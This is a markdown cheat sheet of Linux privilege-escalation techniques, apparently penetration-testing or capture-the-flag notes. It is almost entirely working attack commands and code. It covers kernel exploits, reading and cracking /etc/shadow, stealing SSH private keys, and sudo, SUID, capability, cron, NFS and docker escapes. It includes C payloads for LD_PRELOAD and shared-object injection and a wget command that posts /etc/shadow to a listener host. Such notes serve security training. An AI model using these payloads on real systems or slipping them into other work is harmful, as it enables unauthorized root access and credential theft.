# Escalation Paths

1. [Kernel Exploits](#kernel-exploits)
2. [Stored Passwords](#stored-passwords)
3. [File Permissions](#file-permissions)
4. [Sudo](#sudo)
5. [SUID](#suid)
6. [Capabilities](#capabilities)
7. [Scheduled Tasks](#scheduled-tasks)
8. [NFS Root Squashing](#nfs-root-squashing)
9. [Docker](#docker)

## Kernel Exploits

* [Repo for common kernel exploits](https://github.com/lucyoa/kernel-exploits)

```shell
uname -a
#Google or searchsploit the version
#get exploit code

#we can also use linux-exploit-suggester
./linux-exploit-suggester.sh

#dirty cow exploit
gcc -pthread c0w.c -o cow
#creates executable for exploit

./cow
#privesc

passwd
#elevates user to root
```

## Stored Passwords

```shell
history

ls -la

cat .bash_history
#check for passwords

su root
#use root password

#for stored passwords
find . -type f -exec grep -i -I "PASSWORD" {} /dev/null \;
#check for passwords in current dir

#check using automated tools such as linpeas.sh
```

## File Permissions

```shell
ls -la /etc/passwd

ls -la /etc/shadow
#if we have read access, we can use that

cat /etc/passwd

cat /etc/shadow
#copy both file contents to attacker machine

unshadow passwd shadow
#copy output of required users and their hashes
#we can use this with hashcat or john
#identify hash type with hashcat wiki

su root
#switch to user with password
```

```shell
#hunting for ssh keys
find / -name authorized_keys 2>/dev/null

find / -name id_rsa 2>/dev/null
#private keys

ls -la id_rsa
#attempt to use private key

chmod 600 id_rsa

ssh root@10.10.10.12 -i id_rsa
#we can check into other users' .ssh folder
```

## Sudo

```shell
#sudo shell escaping

sudo -l
#we can run vim as sudo
#get exploit from GTFObins

sudo vim -c ':!/bin/sh'
#gives root shell
```

```shell
#intended functionality

sudo -l
#we can run apache2 as root
#but we do not have exploit in GTFObins

sudo apache2 -f /etc/shadow
#we can view root hash

sudo wget --post=file=/etc/shadow 10.10.14.12:8081
#we get root hash on our listener at port 8081
```

```shell
#LD_PRELOAD

sudo -l
#env var linked to LD_PRELOAD
#we can load our malicious libraries before other libraries

vim shell.c
#add exploit code

gcc -fPIC -shared shell.c -o shell.so -nostartfiles
#fPIC is for position independent code

ls
#shell.so is created

sudo LD_PRELOAD=/home/user/shell.so less
#use full path for .so file
#run with program that can be run as sudo, in this case - less
#this gives us root shell
```

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
```

```shell
#CVE-2019-14287
#for !root sudo permissions

sudo -l

sudo -u#-1 /bin/bash
#we get root shell
```

```shell
#CVE-2019-18634

cat /etc/sudoers
#if pwfeedback option is set (asterisks for password)
#and sudo version < 1.8.26
#this exploit is possible

#get exploit from Google
#compile and run it to get root
```

## SUID

```shell
#suid allows to execute file with permissions of specified user

find / -perm -u=s -type f 2>/dev/null
#find files with suid bit set
#get exploit from GTFObins
#run and get root
```

```shell
#shared object injection

#find files with suid bit set
#check permissions
ls -la /usr/local/bin/suid-so

#run program
/usr/local/bin/suid-so

strace /usr/local/bin/suid-so 2>&1
#attempt to debug

strace /usr/local/bin/suid-so 2>&1 | grep -i -E "open|access|no such file"
#browse through the .so files used for program
#this mentions /home/user/.config/libcalc.so, we can check that

ls -la /home/user/.config/libcalc.so
#no such file or directory

ls -la /home/user
#.config folder does not exist

#we can inject malicious .so file here

vim libcalc.c
#add exploit code

mkdir .config

gcc -shared -fPIC /home/user/libcalc.c -o /home/user/.config/libcalc.so

/usr/local/bin/suid-so
#running this gives us root
#as we injected the so file
```

```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject() {
    system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```

```shell
#binary symlinks

#CVE-2016-1247

dpkg -l | grep nginx
#vulnerable if version < 1.6.2
#and sudo has SUID bit

find / -type f -perm -04000 -ls 2>/dev/null
#find files with suid bit set
#SUID bit set on sudo

ls -la /var/log/nginx
#we have rwx privileges in directory

#get exploit for CVE-2016-1247
./nginxed-root.sh /var/log/nginx/error.log
#the exploit does everything for us
#it will generate root shell when nginx is restarted
#or if root user runs this command
invoke-rc.d nginx rotate >/dev/null 2>&1

#we get root shell
```

```shell
#env variables

env
#view all env variables

echo $PATH
#view path variable

find / -type f -perm -04000 -ls 2>/dev/null
#find files with SUID bit set

#check a vulnerable binary
ls -la /usr/local/bin/suid-env

/usr/local/bin/suid-env

strings /usr/local/bin/suid-env
#check for any other programs or binaries being referred
#this program runs 'service apache2 start'

#we can manipulate env variable

echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }' > /tmp/service.c

cat /tmp/service.c

gcc /tmp/service.c -o /tmp/service

export PATH=/tmp:$PATH

echo $PATH
#now, /tmp will be checked first for 'service' binary, before other directories

/usr/local/bin/suid-env
#run and get root
```

```shell
#env variables
ls -la /usr/local/bin/suid-env2
#another binary with SUID bit set

/usr/local/bin/suid-env2

strings /usr/local/bin/suid-env2
#this refers to a direct path
#'/usr/sbin/service apache2 start'
#unlike the previous binary

#create malicious function
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }

#export the function
export -f /usr/sbin/service

#run binary and get root
/usr/sbin/service
```

## Capabilities

```shell
getcap -r / 2>/dev/null
#get capabilities
#/usr/bin/python2.6 = cap_setuid+ep

#get exploit from GTFObins
/usr/bin/python2.6 -c 'import os; os.setuid(0); os.system("/bin/bash")'
#running this gives root
```

## Scheduled Tasks

```shell
#cron paths

cat /etc/crontab
#view cronjobs
#check PATH variable
#check the directories for files of cronjobs

ls -la /home/user
#does not contain overwrite.sh
#so we can create it

echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh

chmod +x /home/user/overwrite.sh
#wait for a minute for cronjob to run

/tmp/bash -p
#we are root now
```

```shell
#cron wildcards

cat /etc/crontab
#this runs a script every minute

cat /usr/local/bin/compress.sh
#this runs a tar command which uses wildcards
#we can exploit the tar wildcard cronjob

ls -la /usr/local/bin/compress.sh
#we cannot modify the script

echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > runme.sh

chmod +x runme.sh

#get exploit from Google
touch /home/user/--checkpoint=1

touch /home/user/--checkpoint-action=exec=sh\runme.sh
#wildcard injection
#wait for a minute

/tmp/bash -p
#we get root
```

```shell
#cron file overwrites

cat /etc/crontab
#mentions overwrite.sh

locate overwrite.sh

ls -la /usr/local/bin/overwrite.sh
#we have write permissions

echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' >> /usr/local/bin/overwrite.sh

#wait a minute
ls -la /tmp
#cronjob runs

/tmp/bash -p
#we get root
```

## NFS Root Squashing

```shell
cat /etc/exports
#includes option 'no_root_squash'
#this means that folder can be mounted

#in attacker machine
showmount -e 10.10.13.14
#check export list for victim machine
#shows /tmp

mkdir /tmp/mountme

mount -o rw,vers=2 10.10.13.14:/tmp /tmp/mountme

echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }' > /tmp/mountme/x.c

cat /tmp/mountme/x.c

gcc /tmp/mountme/x.c -o /tmp/mountme/x

chmod +s /tmp/mountme/x

#in victim machine
cd /tmp

./x
#we are root now
```

## Docker

```shell
id
#we are a part of docker group

#get exploit from GTFObins

docker images
#check images

docker run -v /:/mnt --rm -it bash chroot /mnt sh
#this gives us root shell
```
